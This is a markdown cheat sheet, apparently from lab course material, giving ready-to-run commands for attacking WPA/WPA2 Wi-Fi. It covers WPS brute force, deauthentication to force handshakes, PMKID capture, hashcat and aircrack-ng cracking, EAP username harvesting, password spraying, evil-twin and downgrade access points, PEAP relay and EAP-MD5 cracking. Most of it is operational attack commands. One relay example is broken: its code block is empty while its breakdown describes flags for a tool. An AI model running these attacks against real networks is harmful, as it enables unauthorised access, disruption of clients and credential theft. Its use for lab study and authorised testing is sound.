# Attacking WPA/WPA2 Wi-Fi Networks

> **Purpose:** Complete, structured reference for attacking WPA/WPA2 Personal and Enterprise networks.  
> **Audience:** Students and red teamers performing WPA/WPA2 assessments in controlled labs.

---

## Overview Workflow

```mermaid
flowchart TD
    A[Start] --> B[Monitor Mode]
    B --> C[Recon: AP + Clients]
    C --> D[Capture Handshake or PMKID]
    D --> E[Convert Capture]
    E --> F[Crack Hash]
    F --> G[Enterprise Recon / Username Extraction]
    G --> H[Bruteforce / Spray]
    H --> I[Evil Twin / Downgrade / Relay]
````

---

## 1. WPA Personal Overview

### Concept

WPA/WPA2-Personal uses a **pre-shared key (PSK)**. Your job is to:

1. Capture a **4-way EAPOL handshake** or **PMKID**
    
2. Crack it offline with a wordlist or more advanced Hashcat attacks.
    

### Wireshark Display Filters

These help you isolate interesting frames in a capture:

|Purpose|Filter|
|---|---|
|Beacon|`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 8)`|
|Probe Request|`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 4)`|
|Probe Response|`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 5)`|
|Authentication|`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 11)`|
|Assoc Request|`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 0)`|
|Assoc Response|`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 1)`|
|EAPOL|`eapol`|
|Disassoc/Deauth|`(wlan.fc.type_subtype == 12) or (wlan.fc.type_subtype == 10)`|

---

## 2. Reconnaissance and Bruteforce (WPS & WPA Personal)

### Concept

First step: **find target APs** and **check for WPS**, encryption, and clients.

### Monitor Mode & Scanning

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo airodump-ng wlan0mon -c 1 --wps
sudo wash -j -i wlan0mon
```

**Breakdown:**

- `airmon-ng start wlan0`
    
    - Enables monitor mode and usually creates `wlan0mon`.
        
- `airodump-ng wlan0mon`
    
    - Scans for nearby APs and clients.
        
- `airodump-ng wlan0mon -c 1 --wps`
    
    - `-c 1` — restricts to channel 1.
        
    - `--wps` — shows WPS info (locked/unlocked, version, etc.).
        
- `wash -j -i wlan0mon`
    
    - `wash` — dedicated WPS scanner.
        
    - `-j` — JSON mode.
        
    - `-i wlan0mon` — use monitor interface.
        

### Vendor Lookup

```bash
grep -i "84-1B-5E" /var/lib/ieee-data/oui.txt
```

**Breakdown:**

- Looks up the **OUI** (first 3 bytes of MAC) to identify the vendor.
    

### Manual Monitor Interface via `iw`

```bash
iw dev wlan0 interface add mon0 type monitor
sudo ifconfig mon0 up
```

**Breakdown:**

- `iw dev wlan0 interface add mon0 type monitor` — create `mon0` as a monitor interface.
    
- `sudo ifconfig mon0 up` — bring it up.
    

### WPS PIN Bruteforce

```bash
sudo reaver -i mon0 -c 1 -b <BSSID>
```

**Breakdown:**

- `reaver` — WPS bruteforce tool.
    
- `-i mon0` — monitor-mode interface.
    
- `-c 1` — AP channel.
    
- `-b <BSSID>` — AP MAC address.
    

---

## 3. Cracking MIC (4-Way Handshake)

### Concept

Capture the 4-way handshake and crack the PSK offline.

### Capture Handshake

```bash
sudo airodump-ng wlan0mon -c 1 -w WPA
```

**Breakdown:**

- `wlan0mon` — monitor interface.
    
- `-c 1` — AP channel.
    
- `-w WPA` — prefix for capture files (e.g., `WPA-01.cap`).
    

### Force Handshake via Deauth

```bash
sudo aireplay-ng -0 5 -a <AP_MAC> -c <Client_MAC> wlan0mon
```

**Breakdown:**

- `-0` — deauth attack.
    
- `5` — send 5 deauth frames.
    
- `-a <AP_MAC>` — AP BSSID.
    
- `-c <Client_MAC>` — target client MAC.
    
- Forces client to reconnect and perform a handshake.
    

### Validate Handshake

```bash
cowpatty -c -r WPA-01.cap
```

**Breakdown:**

- `cowpatty` — WPA handshake cracker/validator.
    
- `-c` — check mode (do not crack, just verify handshake).
    
- `-r` — capture file.
    

### Crack with Cowpatty or Aircrack-ng

```bash
cowpatty -r WPA-01.cap -f /opt/wordlist.txt -s <ESSID>
aircrack-ng -w /opt/wordlist.txt -0 WPA-01.cap
```

**Breakdown:**

- `-r WPA-01.cap` — handshake capture.
    
- `-f /opt/wordlist.txt` — wordlist.
    
- `-s <ESSID>` — ESSID must match target network.
    
- `aircrack-ng -w` — dictionary-based WPA cracking.
    

---

## 4. PMKID Attack

### Concept

PMKID can be captured from some APs without a connected client. It’s a “no-client” WPA attack.

### Capture PMKID

```bash
sudo airmon-ng start wlan0
sudo hcxdumptool -i wlan0mon --enable_status=3
```

**Breakdown:**

- `hcxdumptool` — low-level Wi-Fi capture tool.
    
- `-i wlan0mon` — monitor interface.
    
- `--enable_status=3` — verbose status output (packets, PMKID count, etc.).
    

Optionally, filter by ESSID:

```bash
sudo airodump-ng wlan0mon --essid <ESSID>
```

**Breakdown:**

- Shows only frames for the given ESSID.
    

### Targeted PMKID Capture

```bash
hcxdumptool -i wlan0mon --enable_status=3 \
  --filterlist_ap=<BSSID> --filtermode=2 -o HTBPMKID.pcap
```

**Breakdown:**

- `--filterlist_ap=<BSSID>` — only capture from this AP.
    
- `--filtermode=2` — filter by AP.
    
- `-o HTBPMKID.pcap` — output file.
    

### Convert + Crack

```bash
hcxpcapngtool -o hash HTBPMKID.pcap
hashcat -m 22000 hash /opt/wordlist.txt
```

**Breakdown:**

- `hcxpcapngtool` — convert capture → Hashcat hash format.
    
- `-o hash` — output hash file.
    
- `hashcat -m 22000` — WPA-PBKDF2 mode for PMKID/handshake.
    

---

## 5. WPA Enterprise Reconnaissance

### Concept

WPA/WPA2-Enterprise uses 802.1X and EAP. Targets:

- **Usernames** (EAP identity)
    
- **EAP types** (PEAP, EAP-TLS, EAP-TTLS, etc.)
    

### Capture Enterprise Traffic

```bash
sudo airodump-ng wlan0mon -c 1 -w WPA
```

**Breakdown:**

- Captures EAP negotiation on channel 1.
	    
- Saves to `WPA-01.cap` for offline parsing.
    

### Extract Usernames (EAP Identity)

```bash
tshark -r WPA-01.cap -Y "(eap && wlan.ra == <AP_MAC>) && (eap.identity)" \
  -T fields -e eap.identity
```

**Breakdown:**

- `tshark` — CLI Wireshark.
    
- `-r WPA-01.cap` — input file.
    
- `-Y` — display filter (EAP + identity).
    
- `-T fields -e eap.identity` — print only identity field (usernames).
    

```bash
python2 /opt/crEAP/crEAP.py
```

**Breakdown:**

- `crEAP` — script to extract/format EAP identities from captures.
    

```bash
bash /opt/pcapFilter.sh -f WPA-01.cap -C
```

**Breakdown:**

- Filters capture and displays client/AP relationships and auth attempts.
    

### Identify Authentication Methods

```bash
sudo bash /opt/EAP_buster/EAP_buster.sh HTB-Corp "HTB\\Ketty" wlan0mon
```

**Breakdown:**

- Probes supported EAP methods on a given ESSID.
    
- User “`HTB\Ketty`” is used to test auth methods.
    

---

## 6. Performing Bruteforce Attacks (Enterprise)

### Concept

Most attacks target **PEAP/MSCHAPv2**, which is vulnerable to offline cracking once you capture NTLM-like responses, or to online password spraying.

### Single-User Bruteforce

```bash
echo "HTB\\Sentinal" > user.txt
sudo python2 air-hammer.py -i wlan1 -e HTB-Corp -p /opt/rockyou.txt -u user.txt
```

**Breakdown:**

- `echo "HTB\\Sentinal" > user.txt` — create file with single user `HTB\Sentinal`.
    
- `air-hammer.py` — performs EAP PEAP/MSCHAPv2 bruteforce.
    
- `-i wlan1` — wireless interface used for auth attempts.
    
- `-e HTB-Corp` — target ESSID.
    
- `-p /opt/rockyou.txt` — password list.
    
- `-u user.txt` — user list.
    

### Password Spray (Many Users, One Password)

```bash
cat john.txt | awk '{print "HTB\\" $1}' > domain_users.txt
sudo python2 air-hammer.py -i wlan1 -e HTB-Corp -P football -u domain_users.txt
```

**Breakdown:**

- `cat john.txt` — list of usernames.
    
- `awk '{print "HTB\\" $1}'` — prepend domain `HTB\` to each username.
    
- `> domain_users.txt` — output file of domain users.
    
- `-P football` — single password to spray across many users.
    

### Resume Spray

```bash
sudo python2 air-hammer.py -i wlan1 -e HTB-Corp -P football -u domain_users.txt -s 65
```

**Breakdown:**

- `-s 65` — resume from attempt index 65.
    

---

## 7. EAP Downgrade Attack

### Concept

Trick clients into using a **weaker EAP method** (e.g., PEAP instead of EAP-TLS), then capture their MSCHAPv2 responses using an Evil Twin.

### Certificate Generation

```bash
openssl dhparam -out dh.pem 2048
openssl genrsa -out ca-key.pem 2048
openssl req -new -x509 -nodes -days 100 -key ca-key.pem -out ca.pem
openssl req -newkey rsa:2048 -nodes -days 100 -keyout server-key.pem -out server.csr
openssl x509 -req -days 100 -set_serial 01 -in server.csr -out server.pem -CA ca.pem -CAkey ca-key.pem
```

**Breakdown:**

- `dhparam` — Diffie-Hellman params for TLS.
    
- `ca-key.pem` / `ca.pem` — custom CA key and certificate.
    
- `server-key.pem` / `server.pem` — server key + certificate signed by CA.
    

### Hostapd-mana / Eaphammer

```bash
sudo hostapd-mana hostapd.conf
```

**Breakdown:**

- Starts rogue AP with Evil-Twin/EAP intercept features.
    

```bash
/opt/eaphammer/eaphammer --cert-wizard
sudo /opt/eaphammer/eaphammer \
  --interface wlan1 \
  --negotiate balanced \
  --auth wpa-eap \
  --essid HTB-Corp \
  --creds
```

**Breakdown:**

- `--cert-wizard` — helps generate TLS certs.
    
- `--auth wpa-eap` — Enterprise WPA mode.
    
- `--creds` — log captured credentials / hashes.
    

---

## 8. Enterprise Evil-Twin Attack

### Concept

Impersonate the corporate AP, harvest **NetNTLM / MSCHAPv2 hashes** from PEAP logins, and crack them offline.

### Launch Evil-Twin

```bash
cp /etc/hostapd-wpe/hostapd-wpe.conf hostapd-wpe.conf
sudo hostapd-wpe -c -k hostapd-wpe.conf
```

**Breakdown:**

- `hostapd-wpe` — hostapd patched to capture EAP creds.
    
- `-c` — config file.
    
- `-k` — key file.
    

```bash
/opt/eaphammer/eaphammer --cert-wizard
sudo /opt/eaphammer/eaphammer -i wlan1 -e HTB-Corp --auth wpa-eap --wpa-version 2
```

**Breakdown:**

- `-i wlan1` — interface.
    
- `-e HTB-Corp` — ESSID to clone.
    
- `--wpa-version 2` — WPA2 Enterprise.
    

### Crack Captured NetNTLM Hash

```bash
hashcat -m 5500 -a 0 <captured_hash> wordlist.dict
```

**Breakdown:**

- `-m 5500` — NetNTLMv1/v2 mode.
    
- `-a 0` — straight dictionary attack.
    
- `<captured_hash>` — from Evil Twin logs.
    
- `wordlist.dict` — dictionary file.
    

---

## 9. PEAP Relay Attack

### Concept

Instead of cracking, **relay** a victim’s PEAP authentication from your rogue AP to the real AP (like a wifi-level NTLM relay).

```bash
sudo hostapd-mana ./hostapd.conf
sudo /opt/wpa_sycophant/wpa_sycophant.sh -c wpa_sycophant.config -i wlan2
```

**Breakdown:**

- `hostapd-mana` — rogue AP.
    
- `wpa_sycophant.sh` — relays EAP conversation.
    
- `-i wlan2` — outbound interface towards the real AP.
    

---

## 10. Attacking EAP-TLS Authentication

### Concept

EAP-TLS is certificate-based and strong when configured correctly. Realistic attacks usually rely on:

- Misconfigured client trust
    
- Certificate theft
    
- relays or downgrade paths.
    

### Rogue EAP-TLS Server (Hostapd-WPE)

```bash
cp /etc/hostapd-wpe/hostapd-wpe.conf hostapd-wpe.conf
cd /opt/hostapd-2.6 && patch -p1 < ../hostapd-wpe/hostapd-wpe.patch
cd /opt/hostapd-2.6/hostapd && make
sudo /opt/hostapd-2.6/hostapd/hostapd-wpe hostapd-wpe.conf
```

**Breakdown:**

- Copy config, patch hostapd, compile, run.
    
- Hostapd-WPE will attempt to capture EAP info if clients fail validation.
    

### Relay / MITM Example

```bash
	 
```

**Breakdown:**

- `nagaw.py` — EAP relay tool.
    
- `-i` — inbound interface (from victim).
    
- `-o` — outbound interface (to real AP).
    
- `-t demo` — profile/template.
    

---

## 11. Cracking EAP-MD5

### Concept

EAP-MD5 uses a challenge-response; you can perform **offline dictionary attacks** once you have:

- username
    
- request challenge
    
- response.
    

### Example: Converting Hex Challenge to Colon-Separated Bytes (No `sed`)

```bash
echo 776b900e685dea0230b41eec2010535c | xxd -r -p | hexdump -v -e '16/1 "%02X:" "\n"'
```

**Breakdown:**

- `xxd -r -p` — convert hex string to raw bytes.
    
- `hexdump -v -e '16/1 "%02X:" "\n"'` — print bytes as `AA:BB:CC:...`.
    

(Repeat with the response challenge.)

### Crack Hash with `eapmd5pass`

```bash
eapmd5pass \
  -w /opt/rockyou.txt \
  -U administrator \
  -C <request_challenge> \
  -R <response_challenge> \
  -E <request_id>
```

**Breakdown:**

- `-w` — wordlist.
    
- `-U` — username.
    
- `-C` — request challenge (colon-separated).
    
- `-R` — response (colon-separated).
    
- `-E` — request ID.
    
- Tries passwords from wordlist against MD5 challenge/response.
    

---

## 12. Common Scenarios

|Phase|Action|Command (Example)|
|---|---|---|
|Capture|Grab handshake|`airodump-ng -c 1 -w WPA wlan0mon`|
|Force|Deauth client|`aireplay-ng -0 5 -a <AP> -c <CLIENT> wlan0mon`|
|Validate|Check handshake|`cowpatty -c -r WPA-01.cap`|
|Crack|WPA-Personal|`hashcat -m 22000 hash wordlist.txt`|
|Crack|PMKID|`hcxpcapngtool` → `hashcat -m 22000`|
|Recon|Enterprise usernames|`tshark`, `crEAP`, `pcapFilter.sh`|
|Attack|Enterprise spray|`air-hammer.py`|
|Attack|Evil Twin|`hostapd-mana`, `eaphammer`, `hostapd-wpe`|
|Attack|PEAP relay|`wpa_sycophant.sh`|

---

## 13. Troubleshooting Tips

|Problem|Cause|Fix|
|---|---|---|
|No handshake|No client reconnecting|Use deauth (`aireplay-ng -0`) or wait for real reconnect|
|No PMKID|AP not vulnerable|Fall back to handshake capture|
|Spray fails|Wrong domain format|Use `DOMAIN\\user` consistently|
|Cert errors on clients|Wrong CA/server pairing|Re-generate CA + server cert correctly|
|No usernames extracted|Different EAP / encrypted only|Use `EAP_buster` and verify capture scope|

---

## 14. Cross-Tool Reference

|Purpose|Tool|Alternative|
|---|---|---|
|Capture PMKID|`hcxdumptool`|`Bettercap wifi`|
|Crack WPA|`hashcat`|`aircrack-ng`|
|Username extraction|`tshark`|`crEAP`, custom scripts|
|Evil Twin|`eaphammer`|`hostapd-mana`, `wpe`|
|Enterprise spray|`air-hammer.py`|Custom Python tools|

---

### Summary

- **WPA-Personal:** capture handshake/PMKID → offline crack.
    
- **WPA-Enterprise:** focus on usernames, EAP types, PEAP/MSCHAPv2, and relay/downgrade attacks.
    
- **Evil Twins:** need correct certificates + convincing ESSID/BSSID/channel.
    
- **Hashcat:** central for cracking (`-m 22000` for WPA, `-m 5500` for NetNTLM, other modes for side stuff).
    
